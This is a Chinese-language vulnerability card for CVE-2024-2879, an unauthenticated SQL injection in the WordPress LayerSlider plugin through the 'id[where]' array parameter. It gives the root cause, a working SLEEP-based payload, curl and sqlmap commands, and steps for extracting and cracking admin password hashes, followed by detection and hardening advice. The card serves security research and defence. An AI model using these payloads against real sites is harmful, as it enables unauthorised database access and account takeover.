---
id: web-generic-sqli-wordpress-layerslider-popup-markup-where-array
title: WordPress LayerSlider ls_get_popup_markup 的 id[where] 数组参数未授权 SQL 注入（CVE-2024-2879）：esc_sql 转义循环显式跳过 where 键
type: scenario
domain: web
path: web/generic/sqli
technique: wordpress-layerslider-popup-markup-array-where-sqli
aliases:
- CVE-2024-2879
- LayerSlider SQL 注入
- LayerSlider 7.10.0
- ls_get_popup_markup
- id[where]
- LS_Sliders::find where 注入
- WordPress 插件数组参数注入
tags:
- web
- wordpress
- layerslider
- sqli
- php
- mysql
- time-based-blind
- array-parameter
- esc-sql-bypass
cve:
- CVE-2024-2879
severity: high
confidence: high
affected_versions: LayerSlider 7.9.11 - 7.10.0
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V361
  verified_at: '2026-11-09T02:15:56+08:00'
  notes: 已对照原文全文与2张图核对：01.png 为 find() 转义循环 if($key !== 'where') 跳过 where 的代码截图，02.png 为 Burp 请求 id[where]=(SELECT 0 FROM (SELECT SLEEP(5))dwade)，响应 200、Content-Length 0、耗时 5736ms，SLEEP(5) 时间盲注成立；nopriv 钩子、is_numeric 数组绕过、else 分支拼接 sink 与原文代码一致；CVE-2024-2879 与原文一致；affected_versions 原文明确 7.9.11–7.10.0，初稿已正确未改动。未验证点：未本机复跑 PoC；frontmatter 无 sources/source_url（全库惯例）；dup-scan.json（2026-11-08 19:10）早于本卡建卡（2026-11-09），无涉及本卡 pair。
---

## 一句话结论

WordPress LayerSlider 插件 7.9.11–7.10.0 的 `admin-ajax.php?action=ls_get_popup_markup` 同时注册了 `nopriv` 未登录入口，其 `id` 参数以数组形式（`id[where]=...`）传入时绕过 `is_numeric()` 判断进入查询构造器，而 `LS_Sliders::find()` 的转义循环显式跳过 `where` 键，使该键原样拼进 `WHERE` 子句，构成未授权 SQL 注入（CVE-2024-2879）。

## 原理

- **入口未鉴权**：插件在 `assets/wp/actions.php` 中把 `ls_get_popup_markup()` 同时挂到 `wp_ajax_ls_get_popup_markup` 与 `wp_ajax_nopriv_ls_get_popup_markup`，未登录用户可直接通过 `/wp-admin/admin-ajax.php` 调用。
- **类型判断被数组绕过**：入口代码为 `$id = is_numeric($_GET['id']) ? (int) $_GET['id'] : $_GET['id'];`。PHP 的 `is_numeric()` 对数组返回 `false`，于是整个数组被原样传入 `LS_Sliders::find()`；而 `find()` 的分支判断中 `is_numeric($args)`、`$args === 'random'`、`is_string($args)`、`isset($args[0])` 对关联数组全部为假，正好落入"按查询条件构造"的 `else` 分支。
- **转义循环留后门**：`find()` 的 `else` 分支先合并默认参数（`columns/where/exclude/orderby/order/limit/page/...`），再做统一转义：`foreach($args as $key => $val) { if ($key !== 'where') { $args[$key] = esc_sql($val); } }`——**除 `where` 外的键都被 `esc_sql()` 处理，唯独 `where` 被显式排除**。插件设计上 `where` 是内部调用者传入的可信 SQL 片段（注释也说明动态拼接无法用预处理），但该分支被 AJAX 用户输入直达后这一假设失效。
- **拼接 sink**：随后 `$where = "WHERE ({$args['exclude']}) AND ({$args['where']}) "`（`exclude` 默认为 `removed`，生成 `flag_group = '0' AND flag_deleted = '0'`），最终进入 `$wpdb->get_results("SELECT SQL_CALC_FOUND_ROWS ... FROM $table $where ORDER BY ... LIMIT ...")`，`where` 内容未经任何过滤直接执行。
- **利用形态**：把 `where` 写成标量子查询即可执行任意 SQL 表达式，例如 `id[where]=(SELECT 0 FROM (SELECT SLEEP(5))dwade)` 形成 `WHERE (flag_group='0' AND flag_deleted='0') AND ((SELECT 0 FROM (SELECT SLEEP(5))dwade))`，`SLEEP(5)` 被求值实现时间盲注；payload 不含引号，可同时避开 WordPress 对 `$_GET` 的 magic quotes 转义干扰。查询有结果时接口会 `die()` 输出弹窗 HTML、无结果时输出空内容，也可据此构造布尔盲注差分。

## 触发条件

- WordPress 安装并启用 LayerSlider 7.9.11–7.10.0。
- 目标可访问 `/wp-admin/admin-ajax.php`，`ls_get_popup_markup` 的 `nopriv` 钩子生效（默认启用）。
- 数据库为 MySQL/MariaDB，支持 `SLEEP()`/子查询（时间盲注）或可用布尔差分判断。
- 插件处于默认配置即可，无需登录、无 nonce 校验。

## 利用步骤

1. 指纹确认：页面/资源路径含 `wp-content/plugins/layerslider/`，或读插件版本文件确认在 7.9.11–7.10.0 区间。
2. 访问 `admin-ajax.php?action=ls_get_popup_markup&id=1` 观察是否有滑块标记返回，确认 action 可用。
3. 用嵌套数组参数注入：`id[where]=(SELECT 0 FROM (SELECT SLEEP(5))dwade)`，对比响应耗时确认注入成立。
4. 将 `where` 替换为 sqlmap 可识别的布尔/时间表达式（或直接把该请求交给 sqlmap 指定 `id[where]` 为注入点），逐字符提取 `wp_users.user_pass` 等数据。
5. 取得管理员哈希后离线破解（WordPress 6.x 为 phpass `$P$...`，hashcat `-m 400`），登录后台继续利用。

## PoC

```http
GET /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=(SELECT%200%20FROM%20(SELECT%20SLEEP(5))dwade) HTTP/1.1
Host: target
```

```bash
# 时间盲注验证：响应应延迟约 5 秒，HTTP 200、空响应体
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://target/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id%5Bwhere%5D=(SELECT%200%20FROM%20(SELECT%20SLEEP(5))dwade)'
```

```bash
# sqlmap 时间盲注（参数名带方括号，注意转义）
sqlmap -u 'http://target/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1' \
  --dbms mysql -p 'id[where]' --technique=T --batch
```

## 变体与关联

- **布尔盲注变体**：`id[where]=1=1` 与 `id[where]=1=2` 分别对应返回弹窗 HTML 与空响应，可按响应体差异做布尔盲注；也可换 `SLEEP(0.1)` 降低延迟痕迹。
- **同插件其他入口**：`find()` 的 `where` 参数是通用查询构造器，其他把用户可控数组传给 `LS_Sliders::find()` 的 AJAX action 可能同样可达；审计时可全局搜 `LS_Sliders::find(` 的调用点。
- **同类模式**：PHP 数组参数绕过过滤/类型判断导致拼接注入，参见 [[web-generic-sqli-php-array-filter-walk-recursive-unfiltered]]；WordPress 插件 ORDER BY 裸拼时间盲注参见 [[web-generic-sqli-wordpress-plugin-order-by-time-blind]]；WordPress 插件未授权 SQL 注入的 nonce/参数配合参见 [[web-generic-sqli-wordpress-ultimate-member-sorting-cve-2024-1071]]。
- **边界**：升级到 7.10.0 之后版本即修复；若目标禁用插件或 `admin-ajax.php` 被 WAF 拦截数组参数，则不可达。

## 检测与防御

- **检测**：`admin-ajax.php` 请求中出现 `action=ls_get_popup_markup` 且参数名带 `id[where]`/`id%5Bwhere%5D`（或其他 `id[...]` 嵌套键）；`where` 值含 `SLEEP`、`BENCHMARK`、`SELECT`、子查询、`IF(` 等 SQL 片段；同一 IP 对该 action 高频请求且响应耗时呈规律性延迟。
- **修复**：升级 LayerSlider 至 7.10.0 之后的修复版本；或卸载插件。
- **加固**：入口对 `id` 强制标量校验（`is_scalar()` 且 `is_numeric()` 才接受，数组直接拒绝）；查询构造器禁止接收外部输入作为 `where` 片段，列名/表达式一律白名单；数据库账号最小权限；WAF 拦截含 SQL 函数/子查询的 `admin-ajax.php` 数组参数请求。
